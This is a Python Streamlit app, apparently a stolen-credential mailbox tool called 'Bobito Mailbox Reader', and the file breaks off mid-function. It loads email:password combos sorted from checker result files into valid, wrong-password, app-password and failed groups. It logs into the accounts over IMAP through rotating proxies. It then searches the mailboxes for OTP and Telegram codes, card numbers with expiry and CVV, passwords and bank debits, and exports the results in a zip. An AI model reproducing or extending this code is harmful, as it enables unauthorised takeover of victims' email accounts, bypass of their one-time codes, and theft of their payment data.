import streamlit as st
import imaplib
import glob
import os
import re
import base64
import math
import time
import socket
import zipfile
import io
import json
from datetime import datetime
from typing import List, Tuple
from email.header import decode_header
from email import message_from_bytes

try:
    from hosts import host_list
except ImportError:
    def host_list(email: str) -> List[str]:
        domain = email.split("@")[-1].lower() if "@" in email else ""
        return [f"imap.{domain}"] if domain else ["imap.gmail.com"]

# Dynamic Proxy Auto-Fetch Engine
def load_app_proxies() -> List[dict]:
    proxy_files = ["proxies.txt", "proxy_pool.txt", "clean_proxies.txt"]
    dynamic_pool = []
    
    if "session_proxies" in st.session_state and st.session_state.session_proxies:
        for p in st.session_state.session_proxies:
            if isinstance(p, dict):
                dynamic_pool.append(p)
            elif isinstance(p, str) and p.strip():
                dynamic_pool.append({"proxy": p.strip(), "country": "Dynamic", "region": "Global", "latency": 350})
        if dynamic_pool:
            return dynamic_pool

    for pfile in proxy_files:
        if os.path.exists(pfile):
            try:
                with open(pfile, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line_str = line.strip()
                        if not line_str or line_str.startswith("#"):
                            continue
                        parts = [x.strip() for x in line_str.replace(",", "|").split("|") if x.strip()]
                        proxy_addr = parts[0]
                        if ":" in proxy_addr:
                            country = parts[2] if len(parts) > 2 else "unknown"
                            region = parts[3] if len(parts) > 3 else "unknown"
                            latency = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 350
                            dynamic_pool.append({
                                "proxy": proxy_addr,
                                "country": country,
                                "region": region,
                                "latency": latency
                            })
            except Exception as ex:
                st.session_state.folder_debug_logs.append(f"Proxy load warning: {ex}")
            if dynamic_pool:
                return dynamic_pool

    return [
        {"proxy": "dc.oxylabs.info:8000", "country": "Canada", "region": "Ontario", "latency": 1514}
    ]

# Page Configuration & Keep-Alive Injector
st.set_page_config(
    page_title="Bobito Mailbox Reader & Portal Hub",
    page_icon="📥",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.markdown(
    """
    <script>
    setInterval(function(){
        fetch('/_stcore/health').then(res => {});
    }, 30000);
    </script>
    """,
    unsafe_allow_html=True
)

# Persistent Last Account Management & Session Cache
LAST_ACCOUNT_FILE = "last_account.txt"
APP_CONFIG_FILE = "app_config.json"
MANUAL_VALID_FILE = "manual_valid_accounts.txt"
SESSION_CACHE_FILE = "session_cache.json"

DEFAULT_APP_CONFIG = {
    "connection_timeout": 15,
    "imap_port": 993,
    "auto_fallback_probing": True,
    "max_batch_retries": 1
}

def load_app_config():
    if os.path.exists(APP_CONFIG_FILE):
        try:
            with open(APP_CONFIG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                config = DEFAULT_APP_CONFIG.copy()
                config.update(data)
                return config
        except Exception as ex:
            pass
    return DEFAULT_APP_CONFIG.copy()

def save_app_config(config_dict):
    try:
        with open(APP_CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(config_dict, f, indent=2)
    except Exception as ex:
        pass

def save_last_account(account_combo):
    try:
        with open(LAST_ACCOUNT_FILE, "w", encoding="utf-8") as f:
            f.write(account_combo)
    except Exception as ex:
        pass

def load_last_account():
    if os.path.exists(LAST_ACCOUNT_FILE):
        try:
            with open(LAST_ACCOUNT_FILE, "r", encoding="utf-8") as f:
                return f.read().strip()
        except Exception as ex:
            pass
    return ""

def save_session_cache():
    try:
        cache_data = {
            "connected_account_combo": st.session_state.get("connected_account_combo", ""),
            "mb_host": st.session_state.get("mb_host", ""),
            "mb_folders": st.session_state.get("mb_folders", ["INBOX"]),
            "folder_map": st.session_state.get("folder_map", {"INBOX": "INBOX"}),
            "current_page": st.session_state.get("current_page", 1),
            "search_current_page": st.session_state.get("search_current_page", 1),
            "otp_current_page": st.session_state.get("otp_current_page", 1),
            "bot_current_page": st.session_state.get("bot_current_page", 1),
            "bot_filter_mode": st.session_state.get("bot_filter_mode", False),
            "total_matched_count": st.session_state.get("total_matched_count", 0),
            "search_total_matched_count": st.session_state.get("search_total_matched_count", 0),
            "otp_total_matched_count": st.session_state.get("otp_total_matched_count", 0),
        }
        
        for k_name, key_in_state in [("current_messages", "current_messages"), ("otp_messages", "otp_messages"), ("search_messages", "search_messages")]:
            serialized_list = []
            for m in st.session_state.get(key_in_state, []):
                m_copy = m.copy()
                raw_bytes = m_copy.pop("raw", None)
                if raw_bytes and isinstance(raw_bytes, bytes):
                    m_copy["raw"] = base64.b64encode(raw_bytes).decode("ascii")
                else:
                    m_copy["raw"] = ""
                serialized_list.append(m_copy)
            cache_data[k_name] = serialized_list

        with open(SESSION_CACHE_FILE, "w", encoding="utf-8") as f:
            json.dump(cache_data, f)
    except Exception:
        pass

def load_session_cache():
    if os.path.exists(SESSION_CACHE_FILE):
        try:
            with open(SESSION_CACHE_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                for k, v in data.items():
                    if k in ["current_messages", "otp_messages", "search_messages"]:
                        deserialized = []
                        for m in v:
                            m_copy = m.copy()
                            raw_val = m_copy.get("raw")
                            if isinstance(raw_val, str) and raw_val:
                                try:
                                    m_copy["raw"] = base64.b64decode(raw_val.encode("ascii"))
                                except Exception:
                                    m_copy["raw"] = b""
                            else:
                                m_copy["raw"] = b""
                            deserialized.append(m_copy)
                        st.session_state[k] = deserialized
                    else:
                        st.session_state[k] = v
        except Exception:
            pass

# Initialize Session Config
if "app_config" not in st.session_state:
    st.session_state.app_config = load_app_config()

# Initialize Isolated Session State Variables & Restore Session Cache on first load
if "mb_log" not in st.session_state:
    st.session_state.mb_log = []
    load_session_cache()

if "mb_folders" not in st.session_state:
    st.session_state.mb_folders = ["INBOX"]
if "folder_map" not in st.session_state:
    st.session_state.folder_map = {"INBOX": "INBOX"}
if "mb_host" not in st.session_state:
    st.session_state.mb_host = ""
if "current_page" not in st.session_state:
    st.session_state.current_page = 1
if "search_current_page" not in st.session_state:
    st.session_state.search_current_page = 1
if "otp_current_page" not in st.session_state:
    st.session_state.otp_current_page = 1
if "bot_current_page" not in st.session_state:
    st.session_state.bot_current_page = 1
if "folder_debug_logs" not in st.session_state:
    st.session_state.folder_debug_logs = []
if "bot_diag_logs" not in st.session_state:
    st.session_state.bot_diag_logs = []
if "search_diag_logs" not in st.session_state:
    st.session_state.search_diag_logs = []
if "otp_diag_logs" not in st.session_state:
    st.session_state.otp_diag_logs = []
if "current_messages" not in st.session_state:
    st.session_state.current_messages = []
if "search_messages" not in st.session_state:
    st.session_state.search_messages = []
if "otp_messages" not in st.session_state:
    st.session_state.otp_messages = []
if "total_matched_count" not in st.session_state:
    st.session_state.total_matched_count = 0
if "search_total_matched_count" not in st.session_state:
    st.session_state.search_total_matched_count = 0
if "otp_total_matched_count" not in st.session_state:
    st.session_state.otp_total_matched_count = 0
if "bot_filter_mode" not in st.session_state:
    st.session_state.bot_filter_mode = False
if "custom_email" not in st.session_state:
    st.session_state.custom_email = ""
if "custom_pass" not in st.session_state:
    st.session_state.custom_pass = ""
if "custom_host" not in st.session_state:
    st.session_state.custom_host = ""
if "batch_results_table" not in st.session_state:
    st.session_state.batch_results_table = []
if "batch_stats" not in st.session_state:
    st.session_state.batch_stats = {"valid": 0, "wrong": 0, "appass": 0, "failed": 0}
if "batch_run_meta" not in st.session_state:
    st.session_state.batch_run_meta = None
if "active_mail" not in st.session_state:
    st.session_state.active_mail = None
if "connected_account_combo" not in st.session_state:
    st.session_state.connected_account_combo = ""


def log(msg):
    st.session_state.mb_log.insert(0, msg)
    st.session_state.mb_log = st.session_state.mb_log[:50]
    save_session_cache()

def debug_log(msg):
    st.session_state.folder_debug_logs.append(msg)

def bot_log(msg):
    st.session_state.bot_diag_logs.append(msg)

def search_log(msg):
    st.session_state.search_diag_logs.append(msg)

def otp_log(msg):
    st.session_state.otp_diag_logs.append(msg)


def open_imap(host, port, timeout, proxy_str=None):
    import ssl as _ssl
    if not proxy_str or proxy_str == "direct":
        return imaplib.IMAP4_SSL(host, port, timeout=timeout)
    try:
        import socks
    except ImportError:
        return imaplib.IMAP4_SSL(host, port, timeout=timeout)
    raw = None
    user, pw, ph, pp = None, None, "", str(port)
    if "@" in proxy_str:
        auth, hp = proxy_str.rsplit("@", 1)
        if ":" in auth:
            user, pw = auth.split(":", 1)
        else:
            user = auth
        if ":" in hp:
            ph, pp = hp.rsplit(":", 1)
        else:
            ph = hp
    else:
        parts = [p.strip() for p in proxy_str.replace(",", ":").split(":") if p.strip()]
        if len(parts) >= 4:
            if parts[0].isdigit() or (len(parts[1]) > 0 and parts[1].isdigit() and not parts[0].isdigit()):
                ph = parts[0]
                pp = parts[1]
                user = parts[2]
                pw = parts[3]
            else:
                user = parts[0]
                pw = parts[1]
                ph = parts[2]
                pp = parts[3]
        elif len(parts) == 3:
            if parts[1].isdigit():
                ph = parts[0]
                pp = parts[1]
                pw = parts[2]
            else:
                user = parts[0]
                ph = parts[1]
                pp = parts[2]
        elif len(parts) == 2:
            ph, pp = parts
        else:
            ph = proxy_str

    last = None
    for ptype in (socks.SOCKS5, socks.HTTP):
        try:
            kw = {"proxy_type": ptype, "proxy_addr": ph, "proxy_port": int(pp)}
            if user:
                kw["proxy_username"] = user
                kw["proxy_password"] = pw
            raw = socks.create_connection((host, int(port)), timeout=timeout, **kw)
            ctx = _ssl.create_default_context()
            ssock = ctx.wrap_socket(raw, server_hostname=host)
            mail = imaplib.IMAP4_SSL(host)
            mail.sock = ssock
            mail.file = ssock.makefile("rb")
            mail.welcome = mail._getresp()
            return mail
        except Exception as e:
            last = e
            if raw:
                try: 
                    raw.close()
                except Exception: 
                    pass
                raw = None
    raise last or RuntimeError("proxy imap failed")

def load_valid():
    """Optimized instant loader: Scans only valid text result files, bypassing heavy log scanning."""
    valid_map = {}
    
    search_patterns = [
        "mail_results/*valid*.txt",
        "mail_results/*clean*.txt",
        "*valid*.txt",
        "*clean*.txt",
        "manual_valid_accounts.txt"
    ]
    
    all_files = []
    for pat in search_patterns:
        all_files.extend(glob.glob(pat, recursive=True))
        
    all_files = list(dict.fromkeys([p for p in all_files if os.path.isfile(p)]))
    ignore_keywords = ["resume", "unfinished", "remaining", "input", "proxies", "proxy", "config", "blocklist"]
    
    for path in all_files:
        filename_lower = os.path.basename(path).lower()
        if any(kw in filename_lower for kw in ignore_keywords) or filename_lower == LAST_ACCOUNT_FILE:
            continue
            
        try:
            file_mtime = datetime.fromtimestamp(os.path.getmtime(path))
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    clean_combo = line.split("|")[0].replace(" ", "").strip('"\'')
                    if ":" not in clean_combo:
                        continue
                    parts = clean_combo.split(":", 1)
                    email_part = parts[0].strip().lower()
                    pwd_part = parts[1].strip()
                    if "@" not in email_part or "." not in email_part or not pwd_part:
                        continue
                    combo_str = f"{email_part}:{pwd_part}"
                    if email_part not in valid_map or file_mtime > valid_map[email_part][0]:
                        valid_map[email_part] = (file_mtime, combo_str)
        except Exception:
            continue
            
    sorted_items = sorted(valid_map.values(), key=lambda x: x[0], reverse=True)
    options = []
    for file_mtime, combo_str in sorted_items:
        time_label = f"# Found: {file_mtime.strftime('%Y-%m-%d %H:%M:%S')}"
        options.append(time_label)
        options.append(combo_str)
        
    return options if options else ["none"]


def delete_specific_account_from_storage(target_combo: str):
    search_files = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
    for path in search_files:
        filename_lower = os.path.basename(path).lower()
        if filename_lower == LAST_ACCOUNT_FILE or any(kw in filename_lower for kw in ["resume", "unfinished", "remaining", "input", "proxies", "proxy", "config", "blocklist"]):
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            new_lines = []
            for line in lines:
                combo = line.split("|")[0].strip()
                if combo != target_combo:
                    new_lines.append(line)
            with open(path, "w", encoding="utf-8") as f:
                f.writelines(new_lines)
        except Exception:
            pass
    if load_last_account() == target_combo:
        if os.path.exists(LAST_ACCOUNT_FILE):
            try:
                os.remove(LAST_ACCOUNT_FILE)
            except Exception:
                pass


def clear_all_valid_accounts_storage():
    search_files = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
    for path in search_files:
        filename_lower = os.path.basename(path).lower()
        if "valid" not in filename_lower and "clean" not in filename_lower:
            continue
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write("")
        except Exception:
            pass
    if os.path.exists(LAST_ACCOUNT_FILE):
        try:
            os.remove(LAST_ACCOUNT_FILE)
        except Exception:
            pass


def generate_all_mail_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        search_paths = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
        added_files = set()
        
        for path in search_paths:
            filename = os.path.basename(path)
            filename_lower = filename.lower()
            if filename in added_files or filename == LAST_ACCOUNT_FILE or any(kw in filename_lower for kw in ["resume", "unfinished", "remaining"]):
                continue
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    clean_lines = []
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        if ":" in line:
                            combo = line.split("|")[0].strip()
                            if ":" in combo:
                                clean_lines.append(combo)
                
                count = len(clean_lines)
                if count == 0:
                    continue
                
                if "valid" in filename_lower or "clean" in filename_lower:
                    cat_name = f"Clean_Valid_{count}.txt"
                elif "wrong" in filename_lower or "pass" in filename_lower:
                    cat_name = f"Wrong_Password_{count}.txt"
                elif "app" in filename_lower or "2fa" in filename_lower or "otp" in filename_lower:
                    cat_name = f"App_Password_2FA_{count}.txt"
                elif "fail" in filename_lower or "conn" in filename_lower:
                    cat_name = f"Connection_Failed_{count}.txt"
                else:
                    base_wo_ext = os.path.splitext(filename)[0]
                    cat_name = f"{base_wo_ext}_{count}.txt"
                
                file_content = "\n".join(clean_lines)
                zf.writestr(cat_name, file_content)
                added_files.add(filename)
            except Exception:
                continue
    buf.seek(0)
    return buf.getvalue()


def decode_hdr(value):
    try:
        out = []
        for part, enc in decode_header(value or ""):
            out.append(part.decode(enc or "utf-8", errors="ignore") if isinstance(part, bytes) else str(part))
        return "".join(out)
    except Exception:
        return str(value or "")


def get_webmail_portal(email_addr):
    if "@" not in email_addr:
        return "https://mail.google.com"
    domain = email_addr.split("@")[-1].lower()
    portals = {
        "gmail.com": "https://mail.google.com",
        "googlemail.com": "https://mail.google.com",
        "outlook.com": "https://outlook.live.com",
        "hotmail.com": "https://outlook.live.com",
        "live.com": "https://outlook.live.com",
        "yahoo.com": "https://mail.yahoo.com",
        "ymail.com": "https://mail.yahoo.com",
        "icloud.com": "https://www.icloud.com/mail",
        "me.com": "https://www.icloud.com/mail",
        "aol.com": "https://mail.aol.com",
        "zoho.com": "https://mail.zoho.com",
        "proton.me": "https://mail.proton.me",
        "protonmail.com": "https://mail.proton.me"
    }
    return portals.get(domain, f"https://www.{domain}")


def decode_imap_utf7(s: str) -> str:
    if "&" not in s:
        return s
    res = []
    for part in s.split("&"):
        if "-" in part and not part.startswith("-"):
            b64_str, rest = part.split("-", 1)
            if b64_str == "":
                res.append("&" + rest)
            else:
                try:
                    b64_padded = b64_str.replace(",", "/") + "=" * ((4 - len(b64_str) % 4) % 4)
                    decoded = base64.b64decode(b64_padded).decode("utf-16be")
                    res.append(decoded + rest)
                except Exception:
                    res.append("&" + part)
        else:
            res.append(part)
    return "".join(res)


def encode_imap_utf7(s: str) -> str:
    parts = []
    i = 0
    while i < len(s):
        char = s[i]
        if 0x20 <= ord(char) <= 0x7E:
            if char == '&':
                parts.append('&-')
            else:
                parts.append(char)
            i += 1
        else:
            start = i
            while i < len(s) and not (0x20 <= ord(s[i]) <= 0x7E):
                i += 1
            chunk = s[start:i]
            utf16 = chunk.encode('utf-16be')
            b64 = base64.b64encode(utf16).decode('ascii')
            mod_b64 = b64.replace('/', ',').rstrip('=')
            parts.append(f'&{mod_b64}-')
    return "".join(parts)


def clean_display_label(folder_name: str) -> str:
    upper_name = folder_name.upper()
    if upper_name == "INBOX":
        return "INBOX"
    if upper_name.startswith("INBOX.") or upper_name.startswith("INBOX/"):
        return folder_name[6:]
    return folder_name


def parse_imap_list_line(s: str) -> Tuple[str, str, str]:
    s = s.strip()
    flags, delim, raw_name = "", '"."', s
    if s.startswith("("):
        end_paren = s.find(")")
        if end_paren != -1:
            flags = s[1:end_paren].strip()
            remainder = s[end_paren + 1:].strip()
            parts = remainder.split(None, 1)
            if len(parts) >= 1:
                delim = parts[0]
            raw_name = parts[1].strip() if len(parts) == 2 else ""

    if raw_name.startswith('"') and raw_name.endswith('"') and len(raw_name) >= 2:
        raw_name = raw_name[1:-1].replace('\\"', '"')

    return flags, delim, raw_name


def get_imap_path(selected_ui_folder: str) -> str:
    folder_map = st.session_state.get("folder_map", {})
    return folder_map.get(selected_ui_folder, selected_ui_folder)


def list_folders(mail, email_addr: str = "", host_val: str = ""):
    found = set()
    st.session_state.folder_debug_logs = []
    debug_log(f"📧 [TARGET ACCOUNT] Email: '{email_addr}' | Host: '{host_val}'")
    debug_log("🔍 [ENGINE START] Issuing IMAP command: LIST '' '*'")

    try:
        typ, data = mail.list('""', "*")
        debug_log(f"📡 [RESPONSE STATUS] Server Response Code: '{typ}' | Raw Records Count: {len(data) if data else 0}")
        if typ == "OK" and data:
            for idx, item in enumerate(data, 1):
                if not item:
                    continue
                try:
                    s = item.decode("latin1", errors="ignore") if isinstance(item, bytes) else str(item)
                    s = s.strip()
                    debug_log(f"\n  ├─ [Line #{idx} Raw]: {s}")
                    flags, delim, clean_name = parse_imap_list_line(s)
                    flags_lower = flags.lower()

                    if r"\noselect" in flags_lower or r"\nonexistent" in flags_lower:
                        debug_log("  │   └─ ⚠️ FILTERED OUT: Flagged as \\Noselect or \\Nonexistent")
                        continue

                    if clean_name and clean_name not in (".", "/", '""', "''"):
                        decoded_folder = decode_imap_utf7(clean_name)
                        ui_label = clean_display_label(decoded_folder)
                        found.add(decoded_folder)
                        debug_log(f"  │   └─ ✅ ACCEPTED FOLDER: Raw='{decoded_folder}' -> UI='{ui_label}'")
                except Exception as line_ex:
                    debug_log(f"  │   └─ ⚠️ PARSE ERROR: {line_ex}")
                    continue
    except Exception as ex:
        debug_log(f"❌ [EXCEPTION ERROR] Folder enumeration failed: {ex}")

    if not found:
        found.add("INBOX")

    sorted_raw = sorted(list(found), key=lambda x: (0 if x.lower() == "inbox" else 1, clean_display_label(x).lower()))
    folder_map, display_folders = {}, []
    for raw_f in sorted_raw:
        label = clean_display_label(raw_f)
        folder_map[label] = raw_f
        display_folders.append(label)

    st.session_state.folder_map = folder_map
    save_session_cache()
    return display_folders


def open_mail(email_addr, password_val, host_val, timeout=None):
    if timeout is None:
        timeout = st.session_state.app_config.get("connection_timeout", 60)
    port_val = st.session_state.app_config.get("imap_port", 993)
    
    active_proxies = load_app_proxies()
    proxy_str = active_proxies[0].get("proxy") if active_proxies else None
    
    mail = open_imap(host_val, port_val, timeout=timeout, proxy_str=proxy_str)
    mail.login(email_addr, password_val)
    return mail


def get_active_mail(email_addr, password_val, host_val):
    current_combo = f"{email_addr}:{password_val}"
    if st.session_state.get("connected_account_combo") != current_combo or not st.session_state.get("active_mail"):
        if st.session_state.active_mail:
            try:
                st.session_state.active_mail.logout()
            except Exception:
                pass
            st.session_state.active_mail = None
        
        try:
            st.session_state.active_mail = open_mail(email_addr, password_val, host_val)
            st.session_state.connected_account_combo = current_combo
            save_session_cache()
        except Exception as ex:
            st.session_state.active_mail = None
            raise ex
    else:
        try:
            st.session_state.active_mail.noop()
        except Exception:
            try:
                st.session_state.active_mail = open_mail(email_addr, password_val, host_val)
                save_session_cache()
            except Exception as ex:
                st.session_state.active_mail = None
                raise ex
                
    return st.session_state.active_mail


def is_extortion_spam(subject: str, body: str, frm: str = "") -> bool:
    extortion_keywords = [
        "bitcoin wallet", "transfer me", "deactivate and remove all malware",
        "posted to the public", "recorded all your actions", "trojan",
        "remote control function", "my servers", "pay bitcoin", "ransom"
    ]
    combined = f"{subject} {body} {frm}".lower()
    return any(kw in combined for kw in extortion_keywords)


def detect_specific_categories(subject: str, body: str, frm: str = "", pins=None, cards=None, creds=None) -> List[str]:
    if is_extortion_spam(subject, body, frm):
        return []

    categories = []
    combined = f"{subject} {body} {frm}".lower()
    pins = pins or []
    cards = cards or []
    creds = creds or []

    otp_kws = ["otp", "verification", "verify", "verification code", "auth code", "confirm code", "pin", "security code", "code", "confirmation code"]
    if pins or any(kw in combined for kw in otp_kws):
        categories.append("🔑 OTP / CODE")

    tg_kws = ["telegram", "t.me", "tg", "telegram code", "telegram notification", "telegram alert"]
    if any(kw in combined for kw in tg_kws):
        categories.append("📱 TELEGRAM")

    bl_kws = ["blacklist", "blacklisted", "banned", "blocked", "spam list", "denylist"]
    if any(kw in combined for kw in bl_kws):
        categories.append("🚫 BLACKLIST / BAN")

    card_kws = ["cvv", "exp date", "debit", "bank debit", "online purchase", "card ending", "debited by", "debit alert"]
    if cards or any(kw in combined for kw in card_kws):
        categories.append("💳 CARD / DEBIT")

    gen_bot_kws = ["password reset", "security alert", "mcafee", "credential", "application password", "tracking number", "purchase order", "po #"]
    if creds or (not categories and any(kw in combined for kw in gen_bot_kws)):
        categories.append("🤖 BOT MSG")

    return categories


def extract_pins_and_links(text):
    pins = []
    for m in re.finditer(r'(?i)(code|otp|pin|passcode|verification|verify)[^\d]{0,12}(\d{4,8})', text or ""):
        num = m.group(2)
        if num.startswith(("19", "20")) and len(num) == 4:
            continue
        if num in {"0000", "1234", "1111"}:
            continue
        pins.append(num)
    urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', text or "")
    cleaned_urls = [u for u in urls if not any(x in u.lower() for x in ["w3.org", "schema.org", "apple.com/DTDs"])]
    return list(dict.fromkeys(pins)), list(dict.fromkeys(cleaned_urls))


def extract_credentials_and_cards(text):
    card_pattern = r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:[0-9]{4}[ -]?){3}[0-9]{4})\b'
    cards = re.findall(card_pattern, text)
    cleaned_cards = [c.replace(" ", "").replace("-", "") for c in cards]

    card_exp = re.findall(r'(?i)(?:exp(?:iry|piration)?|valid thru|exp date)\s*[:=]?\s*(\d{2}/\d{2,4})', text)
    card_cvv = re.findall(r'(?i)(?:cvv2?|cvc|security code|cid)\s*[:=]?\s*(\d{3,4})', text)
    
    formatted_cards = []
    for c in cleaned_cards:
        detail = f"Card: {c}"
        if card_exp:
            detail += f" | EXP: {card_exp[0]}"
        if card_cvv:
            detail += f" | CVV: {card_cvv[0]}"
        formatted_cards.append(detail)

    cred_patterns = re.findall(r'(?i)(?:password|passwd|login|credentials|app password|gift card)\s*[:=]\s*(\S+)', text)
    
    debit_sources = []
    bank_debits = re.findall(r'(?i)(?:debited by|debit alert|account debited|bank debit|withdrawn from|amt debited)\s*[:=]?\s*([^\n\r,.]+)', text)
    if bank_debits:
        debit_sources.append(f"Bank Debit: {bank_debits[0].strip()}")
        
    online_debits = re.findall(r'(?i)(?:online purchase|payment to|paid to|merchant|transaction at)\s*[:=]?\s*([^\n\r,.]+)', text)
    if online_debits:
        debit_sources.append(f"Online Purchase Debit: {online_debits[0].strip()}")
        
    card_debits = re.findall(r'(?i)(?:card ending in|card ending|debit card charged|charged to card)\s*[:=]?\s*([^\n\r,.]+)', text)
    if card_debits:
        debit_sources.append(f"Card Debit Source: {card_debits[0].strip()}")
        
    orders = re.findall(r'(?i)(?:order confirmation|purchase order|order #|order number|po #)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
    if orders:
        debit_sources.append(f"Order/PO Ref: {orders[0].strip()}")
        
    trackings = re.findall(r'(?i)(?:tracking number|tracking #|track your package|tracking id|shipment tracking)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
    if trackings:
        debit_sources.append(f"Tracking #: {trackings[0].strip()}")

    formatted_cards.extend(debit_sources)

    return list(dict.fromkeys(formatted_cards)), list(dict.fromkeys(cred_patterns))


def clean_boilerplate(text):
    if not text:
        return ""
    patterns = [
        (r"unsubscribe.*?(?:\n|$)", re.IGNORECASE),
        (r"privacy policy.*?(?:\n|$)", re.IGNORECASE),
        (r"confidentiality notice.*?(?:\n\n|$)", re.IGNORECASE),
        (r"this email was sent by.*?(?:\n|$)", re.IGNORECASE)
    ]
    cleaned = text
    for pat, flags in patterns:
        cleaned = re.sub(pat, "", cleaned, flags=flags)
    return cleaned.strip()


def should_blacklist_message(msg, blacklist_input) -> bool:
    if not blacklist_input:
        return False
    blackwords = [w.strip().lower() for w in blacklist_input.split(",") if w.strip()]
    if not blackwords:
        return False
    combined_text = f"{msg.get('subject', '')} {msg.get('body', '')} {msg.get('from', '')}".lower()
    for bw in blackwords:
        if bw in combined_text:
            return True
    return False


def execute_imap_search_safely(mail, field_cmd: str, query_term: str, log_func):
    clean_q = query_term.replace('"', '\\"')
    f_cmd = field_cmd.upper()
    
    for strat_name, search_params in [
        ("Native Raw Unquoted", f'{f_cmd} {clean_q}'),
        ("Native Raw Quoted", f'{f_cmd} "{clean_q}"'),
        ("CHARSET UTF-8 Raw", f'CHARSET UTF-8 {f_cmd} "{clean_q}"'),
    ]:
        log_func(f"  ├─ [SEARCH STRATEGY] Trying: mail.search(None, {repr(search_params)})")
        try:
            typ, data = mail.search(None, search_params)
            if typ == "OK" and data:
                log_func(f"  │   └─ ✅ {strat_name} Successful! Response: {data}")
                return typ, data
        except Exception as ex:
            log_func(f"  │   └─ ⚠️ {strat_name} Failed: {ex}")

    log_func(f"  ├─ [SEARCH STRATEGY 4 - BATCHED SCAN ({f_cmd})] Server native search rejected. Running chunked scan...")
    try:
        typ, data = mail.search(None, "ALL")
        if typ == "OK" and data and data[0]:
            all_ids = (data[0] or b"").split()
            if not all_ids:
                return "OK_FALLBACK", [b""]

            log_func(f"  │   └─ 🔍 Batch scanning {len(all_ids)} messages for query '{query_term}' in field '{f_cmd}'...")
            matched_ids = []
            q_lower = query_term.lower()
            
            if f_cmd == "SUBJECT":
                fetch_query = "(BODY.PEEK[HEADER.FIELDS (SUBJECT)])"
            elif f_cmd == "FROM":
                fetch_query = "(BODY.PEEK[HEADER.FIELDS (FROM)])"
            elif f_cmd == "BODY":
                fetch_query = "(BODY.PEEK[TEXT])"
            else:
                fetch_query = "(BODY.PEEK[])"
            
            chunk_size = 100
            for i in range(0, len(all_ids), chunk_size):
                chunk_ids = all_ids[i:i + chunk_size]
                id_range_bytes = b",".join(chunk_ids)
                
                try:
                    _, fetch_datas = mail.fetch(id_range_bytes, fetch_query)
                    if fetch_datas:
                        for item in fetch_datas:
                            if isinstance(item, tuple) and len(item) >= 2:
                                header_str = item[0].decode("utf-8", errors="ignore")
                                content_bytes = item[1].decode("utf-8", errors="ignore")
                                if q_lower in content_bytes.lower():
                                    mid_match = re.search(r'^(\d+)', header_str.strip())
                                    if mid_match:
                                        matched_ids.append(mid_match.group(1).encode('utf-8'))
                except Exception as chunk_ex:
                    log_func(f"  │   └─ ⚠️ Chunk fetch exception: {chunk_ex}")
                    continue
            
            log_func(f"  │   └─ ✅ Batched Scan Complete! Found {len(matched_ids)} matching message IDs out of {len(all_ids)}.")
            return "OK_FALLBACK", [b" ".join(matched_ids)] if matched_ids else [b""]
    except Exception as ex4:
        log_func(f"  │   └─ ❌ Batched Scan Exception: {ex4}")

    return "NO", [b""]


def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_folders: List[str], 
                            search_query: str = "", search_field: str = "TEXT", mode: str = "SEARCH", 
                            page_size: int = 15, page_number: int = 1, sort_order: str = "Newest First",
                            log_target: str = "DEBUG"):
    if log_target == "SEARCH":
        st.session_state.search_diag_logs = []
        log_func = search_log
    elif log_target == "OTP":
        st.session_state.otp_diag_logs = []
        log_func = otp_log
    else:
        log_func = debug_log

    messages = []
    start_time = time.time()
    
    clean_query = search_query.strip()
    log_func(f"⚙️ [ENGINE INIT] Mode: '{mode}' | Target Folders ({len(target_folders)}): {target_folders}")
    log_func(f"🔎 [SEARCH SPECS] Query: '{clean_query}' | Search Field: '{search_field}' | Page: {page_number} | Page Size: {page_size}")

    total_matched_all_folders = 0

    for f_label in target_folders:
        real_imap_folder = get_imap_path(f_label)
        real_imap_encoded = encode_imap_utf7(real_imap_folder)
        log_func(f"\n📂 [PROCESSING FOLDER] Label='{f_label}' -> IMAP Path='{real_imap_folder}' (Encoded: '{real_imap_encoded}')")
        
        try:
            sel_typ, sel_data = mail.select(f'"{real_imap_encoded}"', readonly=True)
            log_func(f"  ├─ [IMAP SELECT] Status: '{sel_typ}' | Response: {sel_data}")
            
            if sel_typ != "OK":
                log_func(f"  └─ ⚠️ Skipped folder '{f_label}': Failed to select IMAP path.")
                continue

            if mode == "FOLDER_ONLY" or not clean_query:
                log_func("  ├─ [EXECUTING COMMAND] mail.search(None, 'ALL')")
                typ, data = mail.search(None, "ALL")
            else:
                field_cmd = search_field if search_field in ("TEXT", "SUBJECT", "FROM", "BODY") else "TEXT"
                terms = clean_query.split()
                
                if len(terms) > 1:
                    log_func(f"  ├─ [MULTI-TERM SEARCH] Query has {len(terms)} keywords. Executing individual IMAP fetches...")
                    matched_ids_set = set()
                    for t_idx, term in enumerate(terms[:10], 1):
                        log_func(f"  │   ├─ [Term #{t_idx}/10]: '{term}'")
                        sub_typ, sub_data = execute_imap_search_safely(mail, field_cmd, term, log_func)
                        if sub_typ in ("OK", "OK_FALLBACK") and sub_data and sub_data[0]:
                            found_ids = (sub_data[0] or b"").split()
                            matched_ids_set.update(found_ids)
                            log_func(f"  │   └─ Matches for '{term}': {len(found_ids)} IDs")
                    typ = "OK"
                    data = [b" ".join(sorted(matched_ids_set, key=lambda x: int(x)))]
                else:
